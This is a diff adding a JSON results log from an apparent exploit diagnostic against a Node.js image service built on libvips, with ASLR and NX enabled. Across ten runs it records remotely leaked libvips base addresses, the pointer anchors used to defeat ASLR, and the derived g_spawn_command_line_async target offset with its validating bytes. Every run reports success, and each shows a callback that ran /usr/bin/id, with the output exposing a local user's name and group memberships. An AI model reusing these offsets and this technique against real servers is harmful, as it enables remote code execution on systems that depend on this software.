@@ -1,0 +1,586 @@
+{
+  "purpose": "PIE control-target isolation; selector fixed only in this diagnostic",
+  "scope": {
+    "proves": "The remotely recovered randomized libvips base derives a valid g_spawn_command_line_async target under the exact PIE Node artifact.",
+    "does_not_prove": "Automatic heap-selector calibration for this PIE layout; 0x5970 was held constant solely to isolate the control-target variable.",
+    "routes": "HTTP upload and optimization routes plus the callback listener",
+    "aslr": "enabled",
+    "nx": "enabled"
+  },
+  "node": {
+    "version": "25.8.1",
+    "elf_type": "ET_DYN",
+    "build_id": "c52fa8d905d7eab79d16c17215f1618f1b8a4429",
+    "sha256": "4f068fde6d1856f5884072d086999e9ac82234139ddbd3157d15bd1c623e9f5c"
+  },
+  "diagnostic_selector": "0x5970",
+  "lifetimes": 10,
+  "successes": 10,
+  "distinct_libvips_bases": 10,
+  "distinct_control_targets": 10,
+  "results": [
+    {
+      "lifetime": 1,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 11,
+      "libvips_base": "0x7f2ab9c00000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f2ab9f49a13",
+        "derivation": "0x7f2ab9c00000 + 0x349a13 = 0x7f2ab9f49a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f2ab9dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x16f10"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f2ab9dc3120",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x16f08"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f2ab9dc3130",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x16f18"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 2,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 3,
+      "libvips_base": "0x7fd2de400000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7fd2de749a13",
+        "derivation": "0x7fd2de400000 + 0x349a13 = 0x7fd2de749a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fd2de5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68c0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fd2de5c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68b8",
+              "0x8738",
+              "0x9838"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fd2de5c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68c8",
+              "0x8748",
+              "0x9848"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 3,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 6,
+      "libvips_base": "0x7f2722c00000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f2722f49a13",
+        "derivation": "0x7f2722c00000 + 0x349a13 = 0x7f2722f49a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f2722dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xae20"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f2722dc3120",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xae18",
+              "0xe5f48"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f2722dc3130",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0xae28",
+              "0xe5f58"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 4,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 6,
+      "libvips_base": "0x7fb9b4c00000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7fb9b4f49a13",
+        "derivation": "0x7fb9b4c00000 + 0x349a13 = 0x7fb9b4f49a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fb9b4dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8c80"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fb9b4dc3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8c78",
+              "0xaaf8",
+              "0xbbf8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fb9b4dc3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x8c88",
+              "0xab08",
+              "0xbc08"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 5,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 2,
+      "libvips_base": "0x7f3dd6400000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f3dd6749a13",
+        "derivation": "0x7f3dd6400000 + 0x349a13 = 0x7f3dd6749a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f3dd65be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68c0"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f3dd65c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68b8",
+              "0x8738",
+              "0x9838"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f3dd65c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x68c8",
+              "0x8748",
+              "0x9848"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 6,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 7,
+      "libvips_base": "0x7f8c9a400000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f8c9a749a13",
+        "derivation": "0x7f8c9a400000 + 0x349a13 = 0x7f8c9a749a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f8c9a5be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2140"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f8c9a5c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2138",
+              "0x3fb8",
+              "0x50b8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f8c9a5c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2148",
+              "0x3fc8",
+              "0x50c8"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 7,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 6,
+      "libvips_base": "0x7f54e5c00000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f54e5f49a13",
+        "derivation": "0x7f54e5c00000 + 0x349a13 = 0x7f54e5f49a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f54e5dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2140"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f54e5dc3120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2138",
+              "0x3fb8",
+              "0x50b8",
+              "0x13d58"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f54e5dc3130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2148",
+              "0x3fc8",
+              "0x50c8",
+              "0x13d68"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 8,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 4,
+      "libvips_base": "0x7fe5d8400000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7fe5d8749a13",
+        "derivation": "0x7fe5d8400000 + 0x349a13 = 0x7fe5d8749a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7fe5d85be1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2140"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7fe5d85c3120",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2138",
+              "0x3fb8",
+              "0x50b8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7fe5d85c3130",
+            "repetitions": 3,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2148",
+              "0x3fc8",
+              "0x50c8"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 9,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 7,
+      "libvips_base": "0x7f78b6c00000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f78b6f49a13",
+        "derivation": "0x7f78b6c00000 + 0x349a13 = 0x7f78b6f49a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f78b6dbe1b0",
+            "repetitions": 1,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2140"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f78b6dc3120",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2138",
+              "0x3fb8",
+              "0x50b8",
+              "0x13d58"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f78b6dc3130",
+            "repetitions": 4,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x2148",
+              "0x3fc8",
+              "0x50c8",
+              "0x13d68"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    },
+    {
+      "lifetime": 10,
+      "success": true,
+      "exploit_exit": 0,
+      "classification_attempt": 5,
+      "libvips_base": "0x7f7692400000",
+      "control_target": {
+        "module": "libvips",
+        "module_build_id": "2c8b33114a735268d2211ca2003bc4a327b81411",
+        "symbol": "g_spawn_command_line_async",
+        "offset": "0x349a13",
+        "address": "0x7f7692749a13",
+        "derivation": "0x7f7692400000 + 0x349a13 = 0x7f7692749a13",
+        "abi": "command_rdi_error_rsi",
+        "validating_bytes": "534889f14889f331f64883ec2048c744241800000000488d",
+        "remote_anchor_evidence": [
+          {
+            "offset": "0x1be1b0",
+            "value": "0x7f76925be1b0",
+            "repetitions": 2,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6c60",
+              "0xb290"
+            ]
+          },
+          {
+            "offset": "0x1c3120",
+            "value": "0x7f76925c3120",
+            "repetitions": 5,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6c58",
+              "0xb288",
+              "0xd108",
+              "0xe208",
+              "0x17bb8"
+            ]
+          },
+          {
+            "offset": "0x1c3130",
+            "value": "0x7f76925c3130",
+            "repetitions": 5,
+            "minimum_repetitions": 1,
+            "positions": [
+              "0x6c68",
+              "0xb298",
+              "0xd118",
+              "0xe218",
+              "0x17bc8"
+            ]
+          }
+        ]
+      },
+      "callback": {
+        "token_matched": true,
+        "proof_command": "/usr/bin/id",
+        "command_output": "uid=1000(adrian) gid=1000(adrian) groups=1000(adrian),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),126(docker),984(ollama)",
+        "valid": true
+      }
+    }
+  ]
+}
